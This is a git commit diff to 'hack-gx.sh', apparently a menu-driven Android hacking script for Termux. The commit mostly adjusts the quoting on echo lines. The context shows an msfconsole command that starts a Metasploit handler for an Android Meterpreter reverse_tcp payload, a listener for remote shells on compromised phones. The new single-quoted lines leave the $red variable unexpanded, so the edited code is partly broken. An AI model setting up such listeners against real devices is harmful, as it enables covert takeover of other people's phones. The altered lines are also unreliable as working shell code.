d26a522a7f471410c27fa1b98c1f4aa76007386c
GX-Hack <159274804+Mohamedgx4@users.noreply.github.com>
2024-08-15 03:39:20 +0300

    Update hack-gx.sh

--- hack-gx.sh
+++ hack-gx.sh
@@ -110,7 +110,7 @@ if [ $ch == 1 ]; then
 elif [ $ch == 2 ]; then 
     sleep 1s
     clear
-    echo -e "$green starting listener please wait ...' 
+    echo -e "$green starting listener please wait ..."
     msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost 0.0.0.0; run"
 elif [ $ch == 3 ]; then 
     sleep 1s
@@ -118,9 +118,9 @@ elif [ $ch == 3 ]; then
     termux-open-url https://www.youtube.com/@linux_whith_mohamed
 
 else 
-    echo -e "$red Error : please choose an number from list {1,2,3}" 
+    echo -e '$red Error : please choose an number from list {1,2,3}'
     echo ''
-    echo -e "$red restarting ...." 
+    echo -e '$red restarting ....'
     bash hack-gx.sh
     
 fi
